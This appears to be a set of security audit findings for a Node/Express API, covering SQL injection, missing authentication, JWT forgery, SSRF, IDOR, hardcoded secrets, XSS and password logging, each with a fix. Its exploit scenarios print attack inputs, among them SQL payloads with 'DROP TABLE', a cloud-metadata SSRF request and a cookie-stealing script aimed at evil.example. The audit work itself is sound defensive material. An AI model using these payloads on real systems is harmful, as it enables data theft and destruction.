title: SQL injection via unsanitized req.params.id in user lookup query
impact: Arbitrary SQL execution against the users table (and potentially the whole database depending on DB permissions), allowing data exfiltration, boolean/UNION-based extraction of all rows, or stacked queries depending on driver behavior.
description: req.params.id from the URL path is concatenated directly into a SQL string with no parameterization or validation before being passed to pool.query.
exploit_scenario: An attacker requests GET /api/users/1%20OR%201=1 or GET /api/users/1;DROP%20TABLE%20users;-- to alter the query logic, dump the entire users table, or (depending on pg driver multi-statement handling) execute destructive statements.
preconditions: Attacker can reach the /api/users/:id endpoint (no auth required)
recommendation: Use parameterized queries, e.g. pool.query('SELECT * FROM users WHERE id = $1', [req.params.id]), and validate that id is a well-formed integer before use.
snippet: const result = await pool.query(`SELECT * FROM users WHERE id = ${req.params.id}`);

title: SQL injection in unauthenticated destructive DELETE endpoint
impact: Attacker can inject SQL to delete arbitrary rows regardless of id filter (e.g. wipe the whole users table), or leverage injection for broader database compromise.
description: req.params.id is concatenated unsanitized into a DELETE statement, and the route has no authentication or authorization middleware, so any remote caller can inject SQL into a destructive query.
exploit_scenario: DELETE /api/admin/users/0%20OR%201=1 causes the query to become 'DELETE FROM users WHERE id = 0 OR 1=1', deleting every row in the users table with a single unauthenticated request.
preconditions: Route is reachable without authentication (no middleware present anywhere in server.js)
recommendation: Use parameterized queries (pool.query('DELETE FROM users WHERE id = $1', [req.params.id])), validate id as an integer, and require authentication/authorization before this admin-level destructive action.
snippet: await pool.query(`DELETE FROM users WHERE id = ${req.params.id}`);

title: Unauthenticated destructive admin endpoint — any caller can delete any user
impact: Complete unauthenticated privilege escalation to an admin-level destructive action — any anonymous client can delete arbitrary user accounts, one by one or via automated enumeration.
description: The route path implies an admin-only operation, but there is no authentication middleware, JWT verification, or role check anywhere before the delete executes — the app never validates any Authorization header on any route.
exploit_scenario: curl -X DELETE http://target/api/admin/users/1 (no token, no cookie, no header) deletes the account with id=1; looping over IDs wipes the whole users table.
preconditions: Network access to the API; no authentication or admin role required
recommendation: Add authentication middleware that verifies a valid JWT/session and an authorization check that the caller holds an admin role before executing the delete; also parameterize the query.
snippet: await pool.query(`DELETE FROM users WHERE id = ${req.params.id}`);

title: Login endpoint issues a valid JWT for any supplied username with no credential check
impact: Complete authentication bypass / account impersonation — an attacker can obtain a validly-signed token asserting any identity (e.g. 'admin') without ever proving they control that account, defeating any downstream logic that trusts the token's `user` claim.
description: req.body.username (fully attacker-controlled) is signed straight into a JWT with a hardcoded secret; there is no password verification, no database lookup, and no check that the caller is who they claim to be, so anyone can mint a valid identity token for any username, including e.g. 'admin'.
exploit_scenario: POST /api/login {"username":"admin"} returns a valid JWT with user:'admin'; that token can then be presented to any endpoint that trusts the JWT's user claim for authorization decisions, granting full impersonation of the admin account.
preconditions: Attacker can reach the login endpoint; no prior credentials needed
recommendation: Look up the user record, verify a submitted password (hashed comparison), and only then issue a JWT bound to the verified identity; never sign the raw client-supplied username.
snippet: const token = jwt.sign({ user: req.body.username }, JWT_SECRET);

title: Unauthenticated SSRF via attacker-controlled fetch URL
impact: Server-side request forgery allowing access to internal-only network resources and cloud metadata services (e.g. http://169.254.169.254/) from the server's network position, with the response reflected back to the attacker, enabling internal reconnaissance and potential credential theft.
description: req.body.url is passed directly to fetch() with no scheme, host, or allow-list restriction, and the response body is returned to the caller, letting an unauthenticated attacker make the server issue arbitrary outbound requests (internal services, cloud metadata endpoints, loopback) and read the results.
exploit_scenario: POST /api/fetch-url {"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"} (or any internal-only URL, or file://, gopher:// depending on runtime fetch implementation) causes the server to fetch it and return the response body to the attacker.
preconditions: Attacker can reach the endpoint; no authentication required; server has network access to sensitive internal targets (common in cloud deployments)
recommendation: Require authentication, then restrict destinations to an explicit allow-list of hosts/schemes, resolve and block private/link-local/loopback IP ranges (including after redirects), and do not reflect raw response bodies back to the client.

title: Unauthenticated IDOR exposes any user's full record
impact: Any unauthenticated party can enumerate ids and read every user's stored data (potentially including password hashes, emails, PII) without ever proving who they are.
description: req.params.id (attacker-controlled) is used to fetch and return an arbitrary user's full row via res.json with no authentication, session ownership check, or authorization of any kind guarding the route.
exploit_scenario: An attacker iterates `GET /api/users/1`, `/2`, `/3`, ... with no Authorization header and dumps the entire users table one row at a time.
preconditions: Network access to the API (default deployment, no auth required)
recommendation: Require authentication and verify the caller is authorized to view the requested user record (owner or admin) before querying; avoid returning full row contents such as password hashes.
snippet: const result = await pool.query(`SELECT * FROM users WHERE id = ${req.params.id}`);

title: Hardcoded, weak JWT signing secret used to issue authentication tokens
impact: Full authentication bypass/impersonation: an attacker who obtains this secret (trivial, since it is in the repo) can mint arbitrary JWTs (e.g. { user: 'admin' }) signed with HS256 that the server will accept as authentic, without ever authenticating.
description: The JWT signing secret is a hardcoded, low-entropy literal committed to source control (and duplicated in .env), rather than a securely provisioned secret. Anyone with read access to the repository can forge valid JWTs for any user.
exploit_scenario: An attacker reads server.js (or the .env file, also committed) to obtain JWT_SECRET, then uses jwt.sign({user:'admin'}, 'super-secret-key-12345') offline to mint a token for any privileged identity, then presents that token to any endpoint that trusts jwt.verify with this secret.
preconditions: Attacker has access to the source repository or the leaked secret value
Some endpoint verifies tokens using JWT_SECRET (verification not shown here but is the obvious intended use)
recommendation: Load the JWT secret from a securely managed secret store / environment variable that is not committed to source control, use a high-entropy value (>=256 bits), rotate it, and never hardcode secrets in source.
symbol: module scope (top-level constant, used in POST /api/login)

title: Hardcoded API key literal committed to source
impact: If this is (or resembles/was derived from) a real key, anyone with repository access can extract and reuse it against the third-party service, incurring cost/abuse or accessing data under the victim's account.
description: A credential resembling a live API key (sk-proj- prefix, consistent with OpenAI-style project keys) is hardcoded as a source literal and committed to git history, exposing it to anyone with repo access.
exploit_scenario: An attacker with read access to the repository (or its git history) extracts API_KEY and uses it directly against the associated third-party API.
preconditions: Attacker has access to the source repository or its git history
The key is live/active on the associated service
recommendation: Remove the key from source and git history, rotate/revoke it at the provider, and load secrets exclusively from a secret manager or environment variables excluded from version control.

title: Secrets file (.env) with DB password, JWT secret, and API key committed to version control
impact: Full exposure of database credentials, JWT signing secret, and a third-party API key to anyone who can read the repository or its git history, even after the file is later deleted or edited.
description: The .env file containing DATABASE_URL, JWT_SECRET, and API_KEY is tracked in git (confirmed via `git ls-files` and present since the initial commit), permanently exposing these credentials to every clone/fork of the repository and its full history.
exploit_scenario: An attacker clones the repository (public repo, leaked internal repo, or shared fork) and reads .env directly, or recovers it from git history via `git log -- .env` / `git show`, obtaining working DB credentials, the JWT signing key, and an API key without any additional access.
preconditions: Attacker has read access to the repository or any clone/fork/mirror of it
recommendation: Remove .env from version control, add it to .gitignore, purge it from git history (e.g. git filter-repo / BFG), and rotate every credential it contained (DB password, JWT secret, API key).

title: Unauthenticated IDOR — any user record readable by iterating :id
impact: Any unauthenticated caller can enumerate integer IDs and read every user's full row (including any stored PII/password hash columns), a complete horizontal authorization bypass across all accounts.
description: req.params.id (attacker-controlled path parameter) flows straight into a DB lookup and the full row is returned with no authentication, session check, or ownership verification anywhere in the handler or in any middleware registered on the app.
exploit_scenario: curl http://target/api/users/1 through /api/users/N with no credentials returns every user's full database row in sequence, allowing bulk account data exfiltration.
preconditions: Network access to the API; no authentication required

title: Hardcoded database credentials in connection string
impact: Anyone with source access obtains full database credentials, enabling direct unauthorized access to the database (read/write/delete on all tables) independent of any application-layer controls.
description: Database username and password are embedded as a plaintext literal in source rather than sourced from a secret store, and are duplicated verbatim in the committed .env file.
exploit_scenario: An attacker reads server.js or .env from the repository, extracts admin:password123, and connects directly to the Postgres instance (if network-reachable) with full admin privileges.
preconditions: Attacker has access to the source repository
The database is reachable from the attacker's network position
recommendation: Never hardcode DB credentials; load connectionString from environment/secret manager, exclude .env from version control, and rotate the exposed password.

title: Database connection string with plaintext password hardcoded in source
impact: Anyone reading the source obtains working database credentials, enabling direct, unauthenticated (from the app's perspective) access to the full 'mydb' database, including the users table referenced elsewhere in this file.
description: The Postgres credentials (including the plaintext password 'password123' for the 'admin' user) are hardcoded directly in server.js rather than being read from process.env, even though an equivalent DATABASE_URL exists in .env — meaning the credential is duplicated and committed in two places in the tracked repository.
exploit_scenario: An attacker with repo access extracts 'admin:password123' and connects directly to the Postgres instance (if network-reachable), bypassing the application entirely and reading/writing all tables including user records.
preconditions: Attacker has read access to the repository
Database host is reachable from the attacker's network position
recommendation: Read the connection string exclusively from process.env.DATABASE_URL (never hardcode it), rotate the database password, and restrict network access to the database to trusted hosts only.

title: Admin-only user deletion endpoint has no authentication or authorization check
impact: Any unauthenticated network client can permanently delete any user account by id, with no login, token, or role check required.
description: The app implements a JWT-issuing login flow (`/api/login`, line 44) as its authentication component, but no route anywhere in the file calls `jwt.verify` or inspects an Authorization header (confirmed by grepping the whole file for verify/authenticate/Authorization/Bearer — no matches). The `/api/admin/users/:id` route assumes some upstream auth middleware gates access to it, but that middleware was never wired in; the login component and the authorization-enforcement component each assume the other exists.
exploit_scenario: An anonymous attacker sends `DELETE /api/admin/users/1` (and iterates ids) with no credentials at all; the server deletes the corresponding row and returns {deleted: true}. There is no session, cookie, or bearer token check anywhere in the request pipeline to stop this.
preconditions: Network access to the API (no default-deny network policy)
No reverse proxy / API gateway in front that independently enforces authentication
recommendation: Add authentication middleware that verifies a JWT (jwt.verify with JWT_SECRET) and an authorization check that the caller's role is admin before executing the delete; apply the same middleware consistently to every sensitive route, not just this one.
snippet: await pool.query(`DELETE FROM users WHERE id = ${req.params.id}`);

title: Reflected XSS via unescaped req.query.q in HTML response
impact: Arbitrary JavaScript execution in the victim's browser session in the context of the API's origin, enabling session/token theft, CSRF-like actions, or further client-side compromise.
description: req.query.q is directly interpolated into an HTML string and sent to the client without any escaping/encoding, and Content-Type defaults to text/html for res.send with a string containing HTML.
exploit_scenario: Attacker sends a victim a link like /api/search?q=<script>fetch('https://evil.example/steal?c='+document.cookie)</script>; when the victim opens it, the script executes in their browser under the app's origin.
preconditions: Victim must click/visit an attacker-crafted link to /api/search?q=... (reflected XSS requires interaction)
recommendation: HTML-escape user input before embedding it in HTML (e.g. use a templating engine with auto-escaping or a library like escape-html), and set an explicit Content-Type/charset, ideally returning JSON instead of raw HTML for a search API.

title: Plaintext user password written to application logs
impact: Any party with access to server logs (log aggregation systems, ops staff, misconfigured log storage, or a log-exfiltration bug elsewhere) obtains users' plaintext passwords, enabling account takeover on this service and, via credential reuse, on other services.
description: The raw, unhashed password submitted during registration (attacker/user-controlled req.body.password) is written verbatim to stdout/logs, a sink with materially weaker access controls and longer retention than the credential store.
exploit_scenario: A user registers with password 'MyRealBankPassword1', which is written in cleartext to the process logs; anyone with log access (or an attacker who compromises the logging pipeline/centralized log store) reads it and reuses it to log into the user's account here or on other sites where the password is reused.
preconditions: Attacker or unauthorized party has access to application logs / log aggregation
recommendation: Never log credentials. Remove the password from the log statement entirely, hash passwords before any storage, and audit other log statements for similar credential leakage.

title: Unsanitized user-controlled password written to application logs
impact: An attacker can inject fake log lines (log forging) by including newline-delimited fake entries inside the password field, potentially misleading log analysis/alerting; separately, and more severely, plaintext passwords are persisted in logs, likely in violation of secure credential-handling requirements.
description: req.body.password is fully attacker-controlled and is written verbatim to stdout/logs with no sanitization, allowing embedded newlines, control characters, or terminal escape sequences to forge log entries or manipulate log-viewing tools, in addition to leaking the plaintext credential.
exploit_scenario: An attacker registers with a password value like 'x\n[INFO] admin login succeeded from 10.0.0.1' to inject a fabricated log line, or with ANSI escape sequences to corrupt terminal-based log viewers reviewed by operators.
preconditions: Log output is consumed by a system or human that trusts line-based log structure
Registration endpoint is reachable
recommendation: Never log raw credentials; if logging registration events, log only non-sensitive identifiers and sanitize/strip control characters from any user-supplied value before logging.
